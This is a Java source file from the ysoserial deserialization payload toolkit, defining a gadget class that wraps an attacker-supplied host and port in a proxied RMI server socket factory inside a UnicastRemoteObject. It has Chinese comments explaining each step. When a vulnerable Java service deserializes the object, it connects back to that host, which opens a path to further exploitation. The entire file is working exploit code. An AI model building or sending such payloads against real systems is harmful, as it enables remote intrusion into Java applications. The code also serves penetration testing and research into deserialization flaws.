package ysoserial.payloads;

import sun.rmi.server.UnicastRef;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.tcp.TCPEndpoint;

import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Proxy;
import java.rmi.Remote;
import java.rmi.server.*;
import java.util.Random;

public class RMIConnectWithUnicastRemoteObject implements ObjectPayload<UnicastRemoteObject>{
    @Override
    public UnicastRemoteObject getObject(String command) throws Exception {
        String host;
        int port;
        int sep = command.indexOf(':');
        if ( sep < 0 ) {
            port = new Random().nextInt(65535);
            host = command;
        }
        else {
            host = command.substring(0, sep);
            port = Integer.valueOf(command.substring(sep + 1));
        }
        ObjID id = new ObjID(new Random().nextInt()); // RMI registry
        TCPEndpoint te = new TCPEndpoint(host, port);

        //1.UnicastRef对象 -> RemoteObjectInvocationHandler
        //obj是UnicastRef对象，先RemoteObjectInvocationHandler封装
        RemoteObjectInvocationHandler handler = new RemoteObjectInvocationHandler((RemoteRef) new UnicastRef(new LiveRef(id, te, false)));
        //2. RemoteObjectInvocationHandler -> RMIServerSocketFactory接口
        //RemoteObjectInvocationHandler通过动态代理封装转化成RMIServerSocketFactory
        RMIServerSocketFactory serverSocketFactory = (RMIServerSocketFactory) Proxy.newProxyInstance(
            RMIServerSocketFactory.class.getClassLoader(),// classloader
            new Class[] { RMIServerSocketFactory.class, Remote.class}, // interfaces to implements
            handler// RemoteObjectInvocationHandler
        );
        //通过反射机制破除构造方法的可见性性质，创建UnicastRemoteObject实例
        Constructor<?> constructor = UnicastRemoteObject.class.getDeclaredConstructor(null); // 获取默认的
        constructor.setAccessible(true);
        UnicastRemoteObject remoteObject = (UnicastRemoteObject) constructor.newInstance(null);
        //3. RMIServerSocketFactory -> UnicastRemoteObject
        //把RMIServerSocketFactory塞进UnicastRemoteObject实例中
        setFieldValue(remoteObject, "ssf", serverSocketFactory);
        return remoteObject;
    }
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

}
